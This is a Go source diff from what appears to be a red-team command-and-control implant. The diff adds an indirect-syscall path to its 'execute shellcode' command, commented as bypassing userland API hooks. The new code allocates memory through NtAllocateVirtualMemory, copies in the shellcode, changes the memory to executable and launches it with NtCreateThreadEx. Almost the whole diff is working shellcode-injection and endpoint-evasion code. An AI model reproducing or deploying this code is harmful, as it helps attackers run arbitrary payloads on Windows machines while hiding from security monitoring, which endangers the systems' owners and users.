@@ -75,6 +75,14 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 		}
 	}
 
+	// Use indirect syscalls if available (bypasses userland API hooks)
+	if IndirectSyscallsAvailable() {
+		return c.executeIndirect(shellcode)
+	}
+	return c.executeStandard(shellcode)
+}
+
+func (c *ExecuteShellcodeCommand) executeStandard(shellcode []byte) structs.CommandResult {
 	// Allocate RW memory in current process
 	addr, _, lastErr := procVirtualAllocSC.Call(
 		0,
@@ -112,12 +120,12 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 
 	// Create thread to execute shellcode
 	hThread, _, lastErr := procCreateThread.Call(
-		0,                // security attributes
-		0,                // stack size (default)
-		addr,             // start address
-		0,                // parameter
-		0,                // creation flags (run immediately)
-		0,                // thread ID
+		0,    // security attributes
+		0,    // stack size (default)
+		addr, // start address
+		0,    // parameter
+		0,    // creation flags (run immediately)
+		0,    // thread ID
 	)
 	if hThread == 0 {
 		return structs.CommandResult{
@@ -127,12 +135,64 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 		}
 	}
 
-	// Don't wait for the thread — let it run in the background.
-	// Close the handle but the thread continues executing.
 	syscall.CloseHandle(syscall.Handle(hThread))
 
 	return structs.CommandResult{
-		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Thread created and running", len(shellcode), addr),
+		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Standard Win32 API\n  Thread created and running", len(shellcode), addr),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func (c *ExecuteShellcodeCommand) executeIndirect(shellcode []byte) structs.CommandResult {
+	currentProcess := ^uintptr(0) // -1 = current process pseudohandle
+
+	// Step 1: Allocate RW memory via NtAllocateVirtualMemory
+	regionSize := uintptr(len(shellcode))
+	var addr uintptr
+	status := IndirectNtAllocateVirtualMemory(currentProcess, &addr, &regionSize,
+		MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: NtAllocateVirtualMemory failed: NTSTATUS 0x%X", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Step 2: Copy shellcode (in-process, no API needed)
+	//nolint:gosec // intentional shellcode execution for red team tool
+	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(shellcode)), shellcode)
+
+	// Step 3: Change to RX via NtProtectVirtualMemory
+	protectAddr := addr
+	protectSize := uintptr(len(shellcode))
+	var oldProtect uint32
+	status = IndirectNtProtectVirtualMemory(currentProcess, &protectAddr, &protectSize,
+		PAGE_EXECUTE_READ, &oldProtect)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: NtProtectVirtualMemory failed: NTSTATUS 0x%X", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	// Step 4: Create thread via NtCreateThreadEx
+	var hThread uintptr
+	status = IndirectNtCreateThreadEx(&hThread, currentProcess, addr)
+	if status != 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: NtCreateThreadEx failed: NTSTATUS 0x%X", status),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	syscall.CloseHandle(syscall.Handle(hThread))
+
+	return structs.CommandResult{
+		Output:    fmt.Sprintf("Shellcode executed successfully\n  Size: %d bytes\n  Address: 0x%X\n  Method: Indirect syscalls (calls from ntdll)\n  Thread created and running", len(shellcode), addr),
 		Status:    "success",
 		Completed: true,
 	}
